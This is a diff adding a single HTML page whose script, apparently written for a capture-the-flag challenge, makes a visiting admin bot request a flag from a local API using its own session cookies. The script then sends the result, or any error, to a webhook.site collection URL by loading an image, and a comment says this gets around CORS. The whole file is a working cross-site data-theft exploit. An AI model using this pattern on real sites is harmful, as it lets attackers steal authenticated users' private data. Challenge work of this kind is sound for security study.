@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      (async () => {
+        try {
+          // Fetch the flag using the bot's admin session
+          const response = await fetch("http://127.0.0.1:5000/api/fetchflag", {
+            credentials: "include",  // Ensures cookies are sent
+            headers: {
+              "Content-Type": "application/json",
+            },
+          });
+
+          if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+          }
+
+          const data = await response.json();
+          
+          // Exfiltrate the flag using an <img> tag (bypasses CORS/ngrok restrictions)
+          const img = new Image();
+          img.src = `https://webhook.site/16626a0b-ec07-4342-a325-200548bd561f?flag=${encodeURIComponent(data.flag)}`;
+
+        } catch (error) {
+          // Send errors to webhook.site for debugging
+          const img = new Image();
+          img.src = `https://webhook.site/16626a0b-ec07-4342-a325-200548bd561f?error=${encodeURIComponent(error.message)}`;
+        }
+      })();
+    </script>
+  </body>
+</html>
